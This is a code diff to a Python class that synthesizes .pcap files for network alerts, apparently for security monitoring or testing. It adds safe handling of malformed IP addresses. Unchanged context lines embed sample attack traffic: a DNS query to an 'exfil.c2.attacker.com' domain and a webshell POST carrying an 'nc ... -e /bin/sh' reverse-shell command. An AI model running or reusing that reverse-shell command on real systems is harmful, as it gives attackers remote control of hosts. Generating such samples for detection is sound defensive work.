@@ -43,10 +43,19 @@ class PcapAnalyzer:
         return " && ".join(filters) if filters else "ip"
 
     @staticmethod
+    def _safe_inet_aton(ip_str: Optional[str], default_ip: str = "192.168.1.105") -> bytes:
+        if ip_str:
+            try:
+                return socket.inet_aton(ip_str.strip())
+            except (OSError, socket.error):
+                pass
+        return socket.inet_aton(default_ip)
+
+    @staticmethod
     def generate_pcap_bytes(alert_dict: Dict[str, Any]) -> bytes:
         """
         Constructs a valid binary .pcap file (Global Header + Packet Headers + Ethernet/IP/UDP/TCP Frames)
-        for a given network alert.
+        for a given network alert. Safely handles missing or malformed IP addresses.
         """
         # PCAP Global Header (24 bytes)
         # magic_number (0xa1b2c3d4), version_major (2), version_minor (4), timezone (0), sigfigs (0), snaplen (65535), network (1 = Ethernet)
@@ -56,6 +65,9 @@ class PcapAnalyzer:
         hostname = alert_dict.get("hostname", "host-node")
         src_ip = alert_dict.get("details", {}).get("source_ip") or "192.168.1.105"
         dst_ip = "10.0.4.15"
+
+        src_ip_bytes = PcapAnalyzer._safe_inet_aton(src_ip, "192.168.1.105")
+        dst_ip_bytes = PcapAnalyzer._safe_inet_aton(dst_ip, "10.0.4.15")
 
         packets = []
 
@@ -68,7 +80,7 @@ class PcapAnalyzer:
                                 b"\x06stage1\x05exfil\x02c2\x08attacker\x03com\x00" \
                                 b"\x00\x10\x00\x01"  # Type TXT (16), Class IN (1)
             udp_header = struct.pack(">HHHH", 53530, 53, 8 + len(dns_query_payload), 0)
-            ip_header = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + 8 + len(dns_query_payload), 54321, 0, 64, 17, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
+            ip_header = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + 8 + len(dns_query_payload), 54321, 0, 64, 17, 0, src_ip_bytes, dst_ip_bytes)
             eth_header = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
             frame = eth_header + ip_header + udp_header + dns_query_payload
             packets.append((now_sec, now_usec, frame))
@@ -76,7 +88,7 @@ class PcapAnalyzer:
             # Synthesize HTTP POST Webshell payload packet
             http_payload = b"POST /upload.php?cmd=nc+185.220.101.5+4444+-e+/bin/sh HTTP/1.1\r\nHost: target-web.local\r\nUser-Agent: python-requests/2.28.1\r\nContent-Length: 0\r\n\r\n"
             tcp_header = struct.pack(">HHIIBBHHH", 49200, 80, 1000, 0, 0x50, 0x18, 64240, 0, 0)
-            ip_header = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + 20 + len(http_payload), 54322, 0, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
+            ip_header = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + 20 + len(http_payload), 54322, 0, 64, 6, 0, src_ip_bytes, dst_ip_bytes)
             eth_header = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
             frame = eth_header + ip_header + tcp_header + http_payload
             packets.append((now_sec, now_usec, frame))
@@ -84,7 +96,7 @@ class PcapAnalyzer:
             # Generic TCP packet
             tcp_payload = f"ALERT {rule_id} TRIGGERED ON {hostname} SRC {src_ip}".encode("utf-8")
             tcp_header = struct.pack(">HHIIBBHHH", 51200, 22, 2000, 0, 0x50, 0x18, 64240, 0, 0)
-            ip_header = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + 20 + len(tcp_payload), 54323, 0, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
+            ip_header = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + 20 + len(tcp_payload), 54323, 0, 64, 6, 0, src_ip_bytes, dst_ip_bytes)
             eth_header = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
             frame = eth_header + ip_header + tcp_header + tcp_payload
             packets.append((now_sec, now_usec, frame))
